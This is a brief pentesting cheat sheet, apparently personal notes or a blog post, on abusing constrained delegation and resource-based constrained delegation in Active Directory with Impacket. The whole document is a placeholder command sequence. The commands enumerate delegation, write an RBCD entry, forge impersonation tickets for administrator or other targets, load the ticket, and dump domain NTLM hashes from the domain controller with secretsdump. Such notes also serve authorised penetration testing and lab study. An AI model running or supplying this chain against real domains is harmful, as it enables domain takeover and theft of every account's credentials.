---
title: "Constrained Delegation"
date: 2024-8-2
tags: ["constrained delegation", "active driectory", "ad", "Windows", "impacket", "rbcd"]
---

---
### Find delegation

```bash
sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k
```

### Check forwardable flag

```bash
impacket-getST -spn <SERVICE>/<DC> -impersonate administrator '<DOMAIN>/<USERNAME>' -hashes :<HASH> -self
```

```bash
# Check flags
describeTicket.py <TICKET_1>.ccache
```

### RBCD

```bash
# Add delegation
impacket-rbcd '<DOMAIN>/<USERNAME>' -hashes :<HASH> -k -delegate-from <USERNAME> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps
```

```bash
# Check
impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k
```

```bash
# Impersonate
impacket-getST '<DOMAIN>/<USERNAME>:<PASSWORD>' -spn <SERVICE>/<DC> -impersonate <TARGET_2>
```

```bash
# Check forwardable flag
describeTicket.py <TICKET_2>.ccache
```

```bash
impacket-getST -spn <SERVICE>/<DC> -impersonate <TARGET_2> '<DOMAIN>/<TARGET_1>' -hashes :<HASH> -additional-ticket <TICKET_2>.ccache
```

```bash
# Import ticket
export KRB5CCNAME='<TICKET_2>.ccache'
```

```bash
impacket-secretsdump -no-pass -k <DC> -just-dc-ntlm
```

<br>